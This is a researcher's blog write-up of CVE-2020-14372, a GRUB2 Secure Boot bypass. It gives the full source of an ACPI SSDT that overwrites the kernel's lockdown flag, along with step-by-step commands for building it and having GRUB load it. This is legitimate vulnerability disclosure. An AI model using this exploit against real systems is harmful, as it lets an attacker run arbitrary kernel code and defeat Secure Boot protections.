<!-- Copyright (C) Máté Kukri, 2021 -->
<!-- NOTE: generated HTML, do *NOT* edit by hand -->
<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="utf-8" />

	<title>CVE-2020-14372: Secure Boot bypass using GRUB2</title>
	<meta name="description" content="Bypassing (not so) Secure Boot with one "simple trick"">
	<meta name="keywords" content="CVE-2020-14372,writeup,POC, GRUB2,UEFI,SecureBoot">
	<meta name="author" content="Máté Kukri">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#000000"/>

	<link rel="stylesheet" type="text/css" href="/res/style.css" />
</head>
<body>
	<ul id="navbar">
		<li><a href="/index.html">blog</a></li>
<li><a href="/about.html">about</a></li>
<li><a href="/projects.html">projects</a></li>
<li><a href="http://git.mkukri.xyz">git</a></li>

	</ul>
	<h1>CVE-2020-14372: Secure Boot bypass using GRUB2</h1>
	<b>2021-05-22 17:11</b>
	<div>
		<h2>Vulnerability details</h2>
<p>One day I typed "help" into GRUB2's console and saw some really "fun"
commands:</p>
<ul><li> read_byte ADDR:      Read 8-bit value from ADDR</li><li> write_byte ADDR VAL: Write 8-bit value VAL to ADDR</li></ul>
<p>I immediately thought I found the most fun Secure Boot bypass, but these
commands output the following under Secure Boot:</p>
<pre><code>error: Secure Boot forbids loading module .../memrw.mod.
</code></pre>
<p>Out of curiosity, booted this way I typed the "acpi" command, and it printed
a usage message telling me to point it to an AML file. It's well-known that
another name for ACPI is a "mechanism to run arbitrary vendor provided code
in the context of your kernel", since we can load ACPI tables with Secure Boot
enabled, we are the "vendor" who can provide that code.</p>
<p>But since there is a one-byte flag (kernel_locked_down) in the data segment of
the booted kernel telling it whether or not its "locked down", we can just
overwrite that flag using an SSDT and let the kernel load arbitrary modules.</p>
<p>The following SSDT accomplishes this by creating a "battery" object called <code>HACK</code>,
and doing the write in said object's <code>_INI</code> method which is always executed by
the kernel:</p>
<pre><code>DefinitionBlock ("trigger.aml", "SSDT", 2, "", "", 0x00001001)
{
  OperationRegion (KMEM, SystemMemory, ADDRESS_GOES_HERE, 4)
  Field (KMEM, DWordAcc, NoLock, WriteAsZeros)
  {
    LKDN, 32
  }
  Device (\_SB_.HACK)
  {
    Name(_HID, EisaId ("PNP0C0A"))
    Name(_UID, 0x02)
    Method(_INI)
    {
      If (LKDN)
      {
        LKDN = Zero
      }
    }
  }
}
</code></pre>
<p>I wrote a proof of concept exploit in Python that helps with generating this SSDT,
but exploting this by hand is not that difficult either. The rough outline is as
follows:</p>
<ul><li> Disable KASLR by adding `nokaslr` to the kernel command line</li><li> Find the **physical** address of the `kernel_locked_down` symbol after booting
   without KASLR</li><li> Insert the address into the SSDT above, than compile that SSDT using `iasl`</li><li> Finally instruct GRUB2 to load the SSDT</li></ul>
<h2>How to use the PoC</h2>
<p>Proof of concept exploit hosted on <a href="https://github.com/kukrimate/CVE-2020-14372">GitHub</a>.</p>
<p>Assumptions:</p>
<ul><li> The attacker has `root` access to the running operating system</li><li> Linux is booted under UEFI Secure Boot with GRUB2 version <=2.02
  (some builds of 2.02 are patched), this will cause kernel lockdown to be enabled</li></ul>
<p>When the above assumptions are met, edit <code>/etc/default/grub</code>, add <code>nokaslr</code>
to <code>GRUB_CMDLINE_LINUX_DEFAULT</code>, run <code>update-grub</code>, and then finally reboot.</p>
<p>After the kernel is booted without address space layout randomization, the
<code>genssdt.py</code> script can be used to generate a "malicious" SSDT that will patch
the kernel's memory at runtime to disable lockdown:</p>
<pre><code>python3 genssdt.py > trigger.dsl
iasl trigger.dsl
cp trigger.aml /boot/efi/evil_ssdt.aml
</code></pre>
<p>Now that the SSDT was created, the GRUB configuration file
(usually at <code>/boot/grub/grub.cfg</code>) must be edited to make GRUB load this SSDT
(adding this to the top of this file):</p>
<pre><code>acpi (hd0,gpt1)/evil_ssdt.aml
</code></pre>
<p>Based on where the EFI system partition (where we placed the SSDT above) resides
on disk, <code>(hd0,gpt1)</code> might need to be replaced with something else.</p>
<p>Finally after a reboot, kernel lockdown should be disabled, giving <code>root</code> the
ability to execute arbitrary code in the kernel.
</p>

	</div>
</body>
</html>
